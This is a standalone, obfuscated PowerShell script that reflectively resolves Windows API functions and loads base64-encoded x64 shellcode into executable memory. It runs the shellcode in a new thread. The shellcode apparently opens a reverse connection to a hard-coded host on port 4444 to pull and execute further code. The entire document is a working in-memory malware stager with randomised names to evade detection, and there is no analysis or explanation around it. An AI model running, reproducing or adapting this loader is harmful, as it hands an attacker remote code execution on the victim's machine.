function z1s {
        Param ($fG2, $aTdst)
        $xzP4T = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $xzP4T.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($xzP4T.GetMethod('GetModuleHandle')).Invoke($null, @($fG2)))), $aTdst))
}

function cTpyP {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $riI,
                [Parameter(Position = 1)] [Type] $hubw5 = [Void]
        )

        $bYp = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $bYp.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $riI).SetImplementationFlags('Runtime, Managed')
        $bYp.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $hubw5, $riI).SetImplementationFlags('Runtime, Managed')

        return $bYp.CreateType()
}

[Byte[]]$etb = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSA+3SkpIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGFBEi0AgSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcCgABGEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
[Uint32]$sW7 = 0
$vFnN = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((z1s kernel32.dll VirtualAlloc), (cTpyP @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $etb.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($etb, 0, $vFnN, $etb.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((z1s kernel32.dll VirtualProtect), (cTpyP @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($vFnN, [Uint32]$etb.Length, 0x10, [Ref]$sW7)) -eq $true) {
        $mV = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((z1s kernel32.dll CreateThread), (cTpyP @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$vFnN,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((z1s kernel32.dll WaitForSingleObject), (cTpyP @([IntPtr], [Int32]))).Invoke($mV,0xffffffff) | Out-Null
}
